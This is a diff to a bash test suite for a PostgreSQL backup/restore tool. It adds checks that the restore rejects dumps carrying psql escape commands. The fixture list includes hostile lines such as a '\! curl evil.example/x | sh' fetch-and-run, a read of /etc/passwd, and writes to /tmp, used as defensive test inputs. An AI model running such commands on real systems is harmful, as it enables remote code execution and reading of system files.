@@ -19,6 +19,19 @@ SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 
 PASS=0
 FAIL=0
+# POSITIVE CONTROL for the harness itself. The awk program lives inside a
+# single-quoted shell string, so one apostrophe in its comments closes the
+# string and the file stops parsing — which really happened during review. That
+# failure makes pg_dump_is_complete UNDEFINED, and an undefined function is
+# silent and non-zero: it would sail through a "produces no stdout" assertion
+# and read as a rejection everywhere else. Assert the lib parses and the
+# function exists BEFORE any test trusts its answers.
+if ! bash -n "$SCRIPT_DIR/lib/pg-dump-guard.sh" 2>/dev/null; then
+  printf '  \033[0;31mFAIL\033[0m lib/pg-dump-guard.sh does not parse\n'; exit 1
+fi
+if [ "$(type -t pg_dump_is_complete)" != function ]; then
+  printf '  \033[0;31mFAIL\033[0m pg_dump_is_complete is not defined after sourcing the lib\n'; exit 1
+fi
 ok() { PASS=$((PASS + 1)); printf '  \033[0;32mok\033[0m %s\n' "$1"; }
 no() { FAIL=$((FAIL + 1)); printf '  \033[0;31mFAIL\033[0m %s\n' "$1"; }
 TMP=$(mktemp -d); trap 'rm -rf "$TMP"' EXIT
@@ -164,6 +177,35 @@ done
 [ "$sym" -eq 6 ] && ok "restore.sh validates all 6 dumps backup.sh would store" \
                  || no "restore.sh accepted only $sym/6 dumps backup.sh would store"
 
+echo "== restore REFUSES psql meta-commands that escape the database =="
+# Completeness had to become permissive about leading-backslash lines so a future
+# pg_dump trailer cannot fail every backup — which means completeness can no
+# longer double as safety (cage-match #157 r4, Carnot). These two concerns are
+# now separate, so the escape-guard is what must catch a replay that reaches
+# outside the DB. Each fixture is a COMPLETE, valid dump plus one hostile line,
+# so it isolates the escape-guard rather than passing for the wrong reason.
+validate() {  # 0 if restore would accept the file
+  ( set +e; RESTORE_LIB_ONLY=1 . "$SCRIPT_DIR/restore.sh" >/dev/null 2>&1
+    _validate_pg_dump probe "$1" >/dev/null 2>&1 )
+}
+for evil in '\! curl evil.example/x | sh' '\i /etc/passwd' '\o /tmp/pwned' '\copy t TO /tmp/x' '\gexec'; do
+  make_dump "$TMP/evil.sql" 1
+  printf '%s\n' "$evil" >> "$TMP/evil.sql"
+  # Precondition: it must be a COMPLETE dump, or the refusal proves nothing.
+  if ! pg_dump_is_complete "$TMP/evil.sql"; then
+    no "fixture for [$evil] is not a complete dump — test would pass for the wrong reason"
+  elif validate "$TMP/evil.sql"; then
+    no "restore refuses [$evil]"
+  else
+    ok "restore refuses [$evil]"
+  fi
+done
+# Null arm: the same fixture WITHOUT a hostile line must still validate, or the
+# guard is just refusing everything and the tests above are meaningless.
+make_dump "$TMP/benign.sql" 1
+validate "$TMP/benign.sql" && ok "restore still accepts a clean dump (null arm)" \
+                           || no "restore rejects a clean dump — escape-guard is over-broad"
+
 echo "== the CLASS is closed: no tail-window marker guard survives =="
 # Corpus assertion, not a spot fix — this fails if a copy of the guard is ever
 # pasted in rather than sourced from the lib. Scope, honestly: it covers scripts/
@@ -187,6 +229,35 @@ knob=$(grep -rn --include="*.sh" -- "PG_DUMP_TAIL_WINDOW" "$SCRIPT_DIR" 2>/dev/n
        | grep -vE '^[^:]+:[0-9]+:[[:space:]]*#' || true)
 [ -z "$knob" ] && ok "the PG_DUMP_TAIL_WINDOW env knob stays deleted" \
                || no "PG_DUMP_TAIL_WINDOW reintroduced: $knob"
+
+echo "== the guard is SILENT — it is a predicate, not a filter =="
+# r4 raised this as a POSIX claim ("a record matching no rule is printed"). It is
+# false — awk's default {print} applies to a PATTERN WITH NO ACTION, not to
+# unmatched records — but the consequence if it were ever true is severe enough
+# to pin: backup.sh runs from cron, so a chatty guard would mail the schema (and
+# under --inserts, the whole database) into the nightly log. Asserted rather than
+# argued, because "I reasoned it is fine" is not an instrument.
+noise=$(pg_dump_is_complete "$TMP/t1.sql" 2>/dev/null)
+[ -z "$noise" ] && ok "produces no stdout on an accepted dump" \
+                || no "leaked $(printf '%s' "$noise" | wc -c) bytes of dump to stdout"
+noise=$(pg_dump_is_complete "$TMP/trunc.sql" 2>/dev/null)
+[ -z "$noise" ] && ok "produces no stdout on a rejected dump" \
+                || no "leaked $(printf '%s' "$noise" | wc -c) bytes of dump to stdout"
+
+echo "== a leading-dash filename is not parsed as an awk option =="
+cp "$TMP/t1.sql" "$TMP/-dash.sql"
+( cd "$TMP" && pg_dump_is_complete "./-dash.sql" ) && ok "accepts a ./-dash.sql path" \
+                                                  || no "accepts a ./-dash.sql path"
+
+echo "== non-letter psql trailers are footer-shaped too =="
+# `\` + a letter was still a token freeze: it admits \unrestrict only because
+# "u" is a letter, and would reject \; or \! (cage-match #157 r4, Tesla).
+i=0
+for meta in '\;' '\!' '\?' '\1'; do
+  i=$((i + 1)); make_dump "$TMP/nl$i.sql" 1; printf '%s\n' "$meta" >> "$TMP/nl$i.sql"
+  pg_dump_is_complete "$TMP/nl$i.sql" && ok "accepts non-letter trailer: $meta" \
+                                      || no "accepts non-letter trailer: $meta"
+done
 
 echo "== the guard behaves identically across awk dialects =="
 # This check exists because the guard moved completeness off `tail` + `grep -F`
